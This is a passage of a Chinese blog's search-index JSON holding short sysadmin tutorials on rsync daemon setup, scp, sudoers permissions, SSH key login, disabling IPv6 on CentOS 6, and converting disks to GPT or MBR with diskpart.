0.0.0.0/32 auth users = rsync_backup secrets file = /etc/rsync.password #################配置项说明######################## uid:指定运行用户 gid:指定组 fake super: use chroot: 如果\"use chroot\"指定为true，那么rsync在传输文件以前首先chroot到path参数所指定的目录下。这样做的原因是实现额外的安全防护，但是缺点是需要以roots权限，并且不能备份指向外部的符号连接所指向的目录文件。默认情况下chroot值为true。 max connections:最大连接数 timeout:超时时间 pid file:进程号保存路径 lock file:锁文件保存路径 log file:日志文件保存路径 [backup]:模块名 path:指定模块路径 ignore errors:忽略部分错误，不显示在终端中，可在日志中查看 read only:是否只读 list:查看模块路径的内容 hosts allow:允许访问此模块的IP段(deny为拒绝，二选一即可) auth users:认证用户名 secrets file:指定用户密码文件路径 ","date":"2019-06-01 12:17","objectID":"/post/195/:1:6","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"启动服务 [root@backup ~]# systemctl start rsyncd ","date":"2019-06-01 12:17","objectID":"/post/195/:1:7","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"查看进程是否存在 [root@backup ~]# ps -ef|grep rsync root 17177 1 0 14:52 ? 00:00:00 /usr/bin/rsync –daemon –no-detach root 17179 16652 0 14:52 pts/0 00:00:00 grep –color=auto rsync ","date":"2019-06-01 12:17","objectID":"/post/195/:1:8","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"查看端口是否监听 [root@backup ~]# ss -lntup |grep rsync tcp LISTEN 0 5 :873 : users:((“rsync”,pid=17177,fd=4)) tcp LISTEN 0 5 :::873 ::: users:((“rsync”,pid=17177,fd=5)) ","date":"2019-06-01 12:17","objectID":"/post/195/:1:9","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"客户端配置 ","date":"2019-06-01 12:17","objectID":"/post/195/:2:0","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"将密码写到文件中并设置权限(实现非交互) echo '1' \u003e/etc/rsync.password chmod 600 /etc/rsync.password ","date":"2019-06-01 12:17","objectID":"/post/195/:2:1","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"将nfs01的/etc目录传输到backup服务器backup模块中，并指定密码文件（不加–password-file需要手动输入密码） rsync -avz /etc rsync_backup@172.16.1.41::backup --password-file /etc/rsync.password ","date":"2019-06-01 12:17","objectID":"/post/195/:2:2","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"使用–exclude和–exclude-from排除某文件传输 将/etc/hostname文件排除，不传输 rsync -avz /etc rsync_backup@172.16.1.41::backup --password-file /etc/rsync.password --exclude=/etc/hostname ","date":"2019-06-01 12:17","objectID":"/post/195/:2:3","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"按照文件内容排除 [root@nfs01 ~]# cat /data/exclude.txt /etc/hostname /etc/hosts 排除/etc/hostname，/etc/hosts这两个文件 rsync -avz /etc rsync_backup@172.16.1.41::backup --password-file /etc/rsync.password --exclude-from=/data/exclude.txt ","date":"2019-06-01 12:17","objectID":"/post/195/:2:4","tags":["rsync"],"title":"rsync服务(守护进程模式)","uri":"/post/195/"},{"categories":["系统服务"],"content":"rsync注意：目录要求 /home ： 表示将整个 /home 目录复制到目标目录 /home/ ： 表示将 /home 目录中的所有内容复制到目标目录   参数说明： -a, –archive archive mode; equals -rlptgoD (no -H,-A,-X) -rlptgoD(实际参数) -r –递归目录 -l –links 传输链接文件 -p –perms 权限 -t time 文件时间不变 -g –group 文件所有组 -o –owner 文件所有者 -v 显示过程 -P 显示传输进度百分百 -z 传输的时候进行压缩 -e “ssh -p22” 指定ssh端口号 –delete 保持目标与原始目录一模一样 删除不同的部分 排除 –exclude=03.txt –exclude-from 根据提供的文件内容进行排除（文件内容一行一个路径即可） 使用格式： rsync 参数 要传输的文件或目录 目标路径 举例： #将本地/etc/sysconfig 目录传输到目标服务器中 rsync -avz /etc/sysconfig 172.16.1.31:/tmp ","date":"2019-02-12 12:13","objectID":"/post/190/:0:0","tags":["rsync"],"title":"rsync基本使用","uri":"/post/190/"},{"categories":["基础内容","常用命令"],"content":"scp (secure rcp) 不同机器之间传输 每次传输都是全量 rsync 备份 在不同服务器之间传输 增加传输 只传输发生变化的 或者是新文件 使用格式： scp 要复制的文件路径 目标路径 -r 复制目录 -p 保留原文件的修改时间，访问时间和访问权限。 -P 指定远程端口号 #使用：scp -P 4588 要复制的文件路径 目标路径 #本地 /etc/hostname 文件发送到 nfs01 的/tmp目录中 [root@backup ~]# scp /etc/hostname 172.16.1.31:/tmp root@172.16.1.31’s password: hostname 100% 7 3.1KB/s 00:00 #复制远程主机/tmp/xx.txt文件 到本地/tmp目录下 scp -P 4588 root@172.16.1.31:/tmp/xx.txt /tmp ","date":"2019-02-11 22:56","objectID":"/post/162/:0:0","tags":["linux"],"title":"scp简单使用","uri":"/post/162/"},{"categories":["其他"],"content":"Ubuntu下普通用户用sudo执行命令时报\"xxx is not in the sudoers file.This incident will be reported\"错误，解决方法就是在/etc/sudoers文件里给该用户添加权限。如下： 1.切换到root用户下 2./etc/sudoers文件默认是只读的，对root来说也是，因此需先添加sudoers文件的写权限,命令是: chmod u+w /etc/sudoers 3.编辑sudoers文件 vi /etc/sudoers 找到这行 root ALL=(ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名) ps:这里说下你可以sudoers添加下面四行中任意一条 youuser ALL=(ALL) ALL %youuser ALL=(ALL) ALL youuser ALL=(ALL) NOPASSWD: ALL %youuser ALL=(ALL) NOPASSWD: ALL 第一行:允许用户youuser执行sudo命令(需要输入密码). 第二行:允许用户组youuser里面的用户执行sudo命令(需要输入密码). 第三行:允许用户youuser执行sudo命令,并且在执行的时候不输入密码. 第四行:允许用户组youuser里面的用户执行sudo命令,并且在执行的时候不输入密码. 4.撤销sudoers文件写权限,命令: chmod u-w /etc/sudoers 本文转自：http://www.linuxidc.com/Linux/2016-07/133066.htm ","date":"2017-06-21 18:03","objectID":"/post/138/:0:0","tags":["linux"],"title":"Ubuntu报“xxx is not in the sudoers fileThis incident...”错误解决方法","uri":"/post/138/"},{"categories":["基础内容"],"content":"1.按照以下提示输入即可 root@localhost ~]# ssh-keygen -t rsa //采用rsa的加密方式的公钥/私钥 Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): //询问输入私钥和公钥放在那里，直接回车 Enter passphrase (empty for no passphrase): //这里可以给私钥设置密码 Enter same passphrase again: //提示再次输入私钥密码，再次回车 2.进入密钥目录 [root@localhost ~]# cd /root/.ssh 3.ls查看文件可以看到以下两个文件 [root@localhost .ssh]# ls id_rsa id_rsa.pub 4.导入公钥到认证文件中 [root@localhost .ssh]# mv id_rsa.pub authorized_keys 5.给认证文件修改权限600 [root@localhost .ssh]# chmod 600 authorized_keys 6.将配置文件中PasswordAuthentication yes 改为 PasswordAuthentication no //禁止使用密码远程登录系统 [root@localhost .ssh]# vim /etc/ssh/sshd_config ","date":"2017-06-21 17:57","objectID":"/post/134/:0:0","tags":["密钥","私钥","linux","远程"],"title":"linux系统使用密钥验证远程登录","uri":"/post/134/"},{"categories":["基础内容"],"content":"1./etc/sysconfig/network 新增如下一行 NETWORKING_IPV6=off 在 /etc/modprobe.d/dist.conf增加以下内容 alias net-pf-10 off options ipv6 disable=1 关闭ip6iptables自启 chkconfig ip6tables off 4.reboot重启 ","date":"2017-06-12 10:40","objectID":"/post/92/:0:0","tags":[],"title":"Centos6关闭ipv6","uri":"/post/92/"},{"categories":["windows系统"],"content":"第一步、我们下面这个界面按下Shift+F10，会出现第二步中的命令提示符界面 \u003cimg class=“alignnone size-full wp-image-61” src=“images/1.png “1\"” alt=”\" width=“802” height=“602” /\u003e 第二步、输入diskpart命令回车运行工具，然后输入list disk查看磁盘，如下图 \u003cimg class=“alignnone size-full wp-image-65” src=“images/2-1.png “2-1\"” alt=”\" width=“801” height=“600” /\u003e 第三步、输入seclect disk 0，选中磁盘（注意磁盘编号，不要写错） \u003cimg class=“alignnone size-full wp-image-66” src=“images/3.png “3\"” alt=”\" width=“800” height=“601” /\u003e 第四步、选中磁盘后依次输入下面的命令 \u003cimg class=“alignnone size-full wp-image-67” src=“images/4.png “4\"” alt=”\" width=“800” height=“602” /\u003e 1、clean //输入此命令前请务必确定硬盘无重要数据，该命令会清除磁盘 2、convert gpt //将磁盘转换为GPT格式 convert mbr //将磁盘转换为MBR格式 上面两个根据需要输入一条即可 3、list partition //查看磁盘分区信息 第五步、创建分区 \u003cimg class=“alignnone size-full wp-image-68” src=“images/5.png “5\"” alt=”\" width=“794” height=“601” /\u003e 1、create partition efi size=100 //创建EFI分区，大小为100M 2、create partition msr size=128 //创建MSR分区，默认大小是128M 3、create partition primary size=20000 //创建主分区，size=20000就是分区20G，单位是Mb 4、list partition //查看磁盘分区信息 至此分区完成，输入两次exit退出即可。 ","date":"2017-06-08 21:38","objectID":"/post/18/:0:0","tags":["分区","windows","GPT","MBR"],"title":"使用diskpart命令更改磁盘分区为GPT、MBR教程","uri":"/post/18/"}]